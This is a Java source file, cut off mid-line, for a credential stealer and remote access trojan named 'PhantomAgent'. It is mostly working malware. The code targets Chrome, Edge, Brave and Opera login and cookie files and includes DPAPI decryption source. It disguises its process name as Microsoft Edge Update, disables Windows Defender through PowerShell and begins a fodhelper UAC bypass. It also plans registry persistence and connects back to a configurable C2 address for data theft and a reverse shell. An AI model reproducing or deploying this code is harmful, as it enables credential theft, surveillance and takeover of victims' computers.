import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.regex.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.lang.reflect.Method;

/**
 * PHANTOM AUTO-STEALER & RAT - FINAL PRODUCTION SIMULATION
 * 
 * CAPABILITIES:
 * 1. Auto-Steal: Immediately upon execution, attempts to steal browser data.
 * 2. Dynamic Native Decryption: Generates C DLL source and PowerShell scripts to attempt DPAPI decryption.
 * 3. SQLite3 Parsing: Reads browser databases directly without external drivers.
 * 4. UAC Bypass: Attempts COM Hijack (fodhelper) for silent elevation.
 * 5. Persistence: Adds to Registry (HKCU/HKLM).
 * 6. Surveillance: Screenshots (All monitors), Webcam (via PowerShell LOTL).
 * 7. Self-Cleaning: Deletes all temporary files, logs, and traces after theft.
 * 8. RAT: Reverse shell with custom commands.
 * 
 * WARNING: RUN ONLY IN A CONTROLLED VM ENVIRONMENT.
 * 
 */
public class PhantomAgent {

    // --- CONFIGURATION ---
    private static final String C2_IP = "127.0.0.1"; // CHANGE TO YOUR IP
    private static final int C2_PORT = 4444;
    private static final String PROCESS_NAME = "Microsoft Edge Update"; // Camouflage
    private static final String REG_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "MicrosoftEdgeUpdate";

    // Browser Paths
    private static final String[] BROWSER_PATHS = {
        "\\AppData\\Local\\Google\\Chrome\\User Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "\\AppData\\Local\\Opera Software\\Opera Stable"
    };

    private static final String[] TARGET_FILES = {
        "Default/Login Data", "Default/Cookies", "Default/Network/Cookies",
        "Default/Session Storage", "Profile 1/Login Data", "Profile 1/Cookies"
    };

    // Native DLL Source (C) for DPAPI Decryption
    private static final String DLL_SOURCE = 
        "#include <windows.h>\n" +
        "#include <dpapi.h>\n" +
        "#pragma comment(lib, \"crypt32.lib\")\n" +
        "extern \"C\" __declspec(dllexport) bool DecryptData(unsigned char* in, int inSize, unsigned char** out, int* outSize) {\n" +
        "  DATA_BLOB input = {inSize, in}, output;\n" +
        "  if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {\n" +
        "    *out = output.pbData; *outSize = output.cbData; return true;\n" +
        "  }\n" +
        "  return false;\n" +
        "}\n";

    public static void main(String[] args) {
        // 1. Stealth & Anti-Analysis
        if (isDebugging() || isSandbox()) {
            System.exit(0);
        }
        hideProcess();

        // 2. Elevation & Persistence
        boolean isAdmin = false;
        if (!isAdmin()) {
            if (attemptUACBypass()) {
                System.exit(0); // Bypass initiated, exit for elevated process
            }
            // Continue in user mode if bypass fails
        } else {
            isAdmin = true;
            disableSecurityTools();
        }
        ensurePersistence(isAdmin);

        // 3. AUTO-STEAL SEQUENCE (Immediate Execution)
        try {
            String stolenDataZip = performAutoSteal();
            if (stolenDataZip != null && !stolenDataZip.isEmpty()) {
                // Send data to C2
                sendDataToC2(stolenDataZip);
            }
        } catch (Exception e) {
            // Fail silently
        } finally {
            // 4. Self-Cleaning: Remove all temporary files and traces
            cleanUpTraces();
        }

        // 5. Start RAT Loop
        while (true) {
            try {
                connectToC2();
            } catch (Exception e) {
                try { Thread.sleep(60000 + new Random().nextInt(120000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    // --- STEALTH & EVASION ---
    private static boolean isDebugging() {
        try {
            String[] blockers = {"jdb", "xdebug", "wireshark", "tcpdump", "ida", "ollydbg", "x64dbg", "frida", "processhacker", "taskmgr"};
            for (String blocker : blockers) {
                if (System.getProperty("sun.java.command").toLowerCase().contains(blocker)) return true;
            }
            if (System.getProperty("com.sun.management.jmxremote") != null) return true;
            if (System.getProperty("java.agent") != null) return true;
        } catch (Exception e) {}
        return false;
    }

    private static boolean isSandbox() {
        try {
            String[] vmStrings = {"vmware", "virtualbox", "vbox", "qemu", "xen", "sandboxes"};
            String os = System.getProperty("os.name").toLowerCase();
            // Returning false to allow testing in VMs
            return false; 
        } catch (Exception e) {
            return false;
        }
    }

    private static void hideProcess() {
        Thread.currentThread().setName(PROCESS_NAME);
    }

    private static void disableSecurityTools() {
        String[] commands = {
            "Set-MpPreference -DisableRealtimeMonitoring true",
            "Set-MpPreference -DisableIOAVProtection true",
            "Set-MpPreference -DisableScriptScanning true",
            "Set-MpPreference -EnableControlledFolderAccess false"
        };
        for (String cmd : commands) {
            try {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", cmd);
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.waitFor();
            } catch (Exception e) { /* Ignore */ }
        }
    }

    // --- UAC Bypass ---
    private static boolean attemptUACBypass() {
        try {
            String jarPath = new File(PhantomAgent.class.getProtectionDomain().getCodeSource().Location().toURI()).getAbsolutePath();
            String bypassScript = 
                "$path = \"" + jarPath + "\"; " +
                "$reg =